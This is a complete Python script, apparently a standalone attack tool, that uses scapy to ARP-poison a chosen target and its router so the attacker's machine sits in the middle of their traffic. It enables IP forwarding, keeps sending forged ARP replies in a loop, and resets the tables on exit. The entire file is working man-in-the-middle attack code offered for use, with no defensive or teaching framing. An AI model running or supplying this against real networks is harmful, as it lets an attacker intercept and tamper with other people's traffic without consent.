import scapy.all as scapy
import time
import optparse
import os


# Function to parse input values from command line
def input_value():
    parse_object = optparse.OptionParser()
    parse_object.add_option("-t", "--target", dest="target_ip")
    parse_object.add_option("-r", "--router", dest="router_ip")
    return parse_object.parse_args()


# Function to get MAC address of a given IP
def get_mac_address(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    merged = broadcast_packet / arp_request
    mac_list = scapy.srp(merged, timeout=60, verbose=False)[0]
    mac_address = mac_list[0][1].hwsrc
    return mac_address


# Function to perform ARP poisoning
def arp_poisoning(target_ip, poisoned_ip, target_mac, my_mac):
    # Forge ARP packet to target the IPs
    arp_response_target = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
    arp_response_router = scapy.ARP(op=2, pdst=poisoned_ip, hwdst=my_mac, psrc=target_ip)
    
    scapy.send(arp_response_target, verbose=False)
    scapy.send(arp_response_router, verbose=False)


# Function to reset ARP poisoning
def reset_poisoning(fooled_ip, gateway_ip):
    fooled_mac = get_mac_address(fooled_ip)
    gateway_mac = get_mac_address(gateway_ip)
    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)
    scapy.send(arp_response, verbose=False, count=3)


# Enable IP forwarding
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

keys = None
send_number = 0
try:
    # Parsing input values
    (get_keys, get_values) = input_value()
    keys = get_keys
    my_mac = scapy.get_if_hwaddr(scapy.conf.iface)  # Get your own MAC address
    get_target_mac = get_mac_address(keys.target_ip)
    get_router_mac = get_mac_address(keys.router_ip)
    
    while True:
        # Performing ARP poisoning
        arp_poisoning(keys.target_ip, keys.router_ip, get_target_mac, my_mac)
        arp_poisoning(keys.router_ip, keys.target_ip, get_router_mac, my_mac)
        send_number += 2
        print('\rSending packets ' + str(send_number), end='')
        time.sleep(3)
except KeyboardInterrupt:
    print('\nQuit & Reset')
    # Resetting ARP poisoning
    reset_poisoning(keys.target_ip, keys.router_ip)
    reset_poisoning(keys.router_ip, keys.target_ip)
    # Disable IP forwarding after the attack
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
except Exception:
    print('\nError')
    # Resetting ARP poisoning
    reset_poisoning(keys.target_ip, keys.router_ip)
    reset_poisoning(keys.router_ip, keys.target_ip)
    # Disable IP forwarding after the attack
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")